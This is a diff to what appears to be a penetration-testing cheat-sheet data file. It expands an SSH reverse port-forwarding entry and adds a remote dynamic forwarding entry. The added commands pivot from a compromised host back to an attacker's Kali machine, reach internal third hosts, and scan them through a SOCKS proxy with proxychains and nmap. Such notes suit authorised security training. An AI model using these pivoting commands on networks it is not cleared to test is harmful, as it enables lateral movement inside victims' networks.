@@ -130,9 +130,21 @@
         {
           "id": "ssh_pf_reverse",
           "title": "Pivoting: Reverse Forwarding (-R)",
-          "description": "**The Goal:** Send a port from your Kali machine into the compromised network. Critical for catching reverse shells on deeply internal machines.\n\n**How it works:** You log back into your own Kali box from the victim, opening port 60002 on the victim that points back to your Kali listener.",
+          "description": "**The Goal:** Send a port from your Kali machine into the compromised network. Critical for catching reverse shells on deeply internal machines, or forwarding to a 3rd host the compromised box can reach but Kali can't.\n\n**How it works:** You log back into your own Kali box from the victim, opening a port on Kali that forwards through the tunnel to whatever host:port you specify — it doesn't have to be your own listener.",
           "commands": [
-            "ssh -R *:60002:localhost:60002 kali@<Kali_IP>"
+            "ssh -R *:60002:localhost:60002 kali@<Kali_IP>",
+            "ssh -N -R 127.0.0.1:2345:<Internal_3rd_Host_IP>:5432 kali@<Kali_IP>"
+          ]
+        },
+        {
+          "id": "ssh_pf_remote_dynamic",
+          "title": "Pivoting: Remote Dynamic Forwarding (-R <port> alone)",
+          "description": "**The Goal:** Get a full SOCKS proxy into the internal network without needing to SSH out from Kali — useful when you already have a reverse shell/foothold and can't (or don't want to) authenticate back in as an SSH client. Requires OpenSSH >= 7.6 on the compromised host (check with `ssh -V`).\n\n**How it works:** Unlike -D, the SOCKS proxy is bound on the KALI (server) side, not the client. Start sshd on Kali first, run the -R with no target host:port, then point proxychains at Kali's own loopback.",
+          "commands": [
+            "sudo systemctl start ssh",
+            "ssh -N -R 9998 kali@<Kali_IP>",
+            "# On Kali: add 'socks5 127.0.0.1 9998' to /etc/proxychains4.conf, then:",
+            "proxychains nmap -sT --top-ports=20 -Pn -n <Internal_Host_IP>"
           ]
         }
       ]
